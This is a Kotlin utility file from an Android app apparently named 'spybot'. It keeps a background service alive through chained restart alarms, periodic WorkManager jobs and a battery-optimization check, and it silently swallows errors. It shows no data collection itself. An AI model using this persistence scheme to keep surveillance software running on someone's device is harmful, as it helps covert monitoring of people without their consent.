package com.spybot.app.Utils

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.spybot.app.MainService
import com.spybot.app.Receiver.RestartReceiver
import java.util.concurrent.TimeUnit

object ServiceHelper {

    private const val TAG = "ServiceHelper"
    private const val REQUEST_CODE_RESTART = 12345
    private const val REQUEST_CODE_PERIODIC = 12346
    private const val RESTART_DELAY_MS = 5 * 60 * 1000L
    private const val PERIODIC_INTERVAL_MS = 15 * 60 * 1000L
    private const val WORK_TAG = "spybot_persistence"
    private const val WORK_NAME_PERIODIC = "spybot_periodic"
    private const val PREFS_NAME = "spybot_service_prefs"
    private const val KEY_SERVICE_ENABLED = "service_enabled"

    fun scheduleServiceRestartAlarm(context: Context, delayMs: Long = RESTART_DELAY_MS) {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, RestartReceiver::class.java).apply {
            action = MainService.ALARM_ACTION
        }

        val pendingIntent = PendingIntent.getBroadcast(
            context, REQUEST_CODE_RESTART, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        try {
            val triggerTime = SystemClock.elapsedRealtime() + delayMs
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.S -> {
                    if (alarmManager.canScheduleExactAlarms()) {
                        alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent
                        )
                    } else {
                        alarmManager.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent
                        )
                    }
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent
                    )
                }
                else -> {
                    alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
                }
            }
        } catch (e: Exception) {
            scheduleImmediateWorkManager(context)
        }
    }

    fun schedulePeriodicAlarm(context: Context) {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, RestartReceiver::class.java).apply {
            action = MainService.ALARM_ACTION
        }

        val pendingIntent = PendingIntent.getBroadcast(
            context, REQUEST_CODE_PERIODIC, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        try {
            val triggerTime = SystemClock.elapsedRealtime() + PERIODIC_INTERVAL_MS
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setWindow(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    triggerTime, PERIODIC_INTERVAL_MS / 2, pendingIntent
                )
            } else {
                @Suppress("DEPRECATION")
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    triggerTime, PERIODIC_INTERVAL_MS, pendingIntent
                )
            }
        } catch (e: Exception) {}
    }

    fun scheduleWorkManagerFallback(context: Context) {
        try {
            val workRequest = PeriodicWorkRequestBuilder<ServiceWorker>(
                15, TimeUnit.MINUTES
            ).addTag(WORK_TAG).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME_PERIODIC, ExistingPeriodicWorkPolicy.KEEP, workRequest
            )
        } catch (e: Exception) {}
    }

    fun scheduleImmediateWorkManager(context: Context) {
        try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<ServiceWorker>()
                .addTag(WORK_TAG).build()

            WorkManager.getInstance(context).enqueueUniqueWork(
                "spybot_immediate",
                androidx.work.ExistingWorkPolicy.REPLACE,
                workRequest
            )
        } catch (e: Exception) {}
    }

    fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isIgnoringBatteryOptimizations(context.packageName)
        } else {
            true
        }
    }

    fun saveServiceState(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SERVICE_ENABLED, enabled)
            .apply()
    }

    fun shouldServiceRun(context: Context): Boolean {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getBoolean(KEY_SERVICE_ENABLED, true)
    }

    fun initializePersistence(context: Context) {
        saveServiceState(context, true)
        schedulePeriodicAlarm(context)
        scheduleWorkManagerFallback(context)

        if (!MainService.isRunning()) {
            MainService.start(context)
        }
    }
}
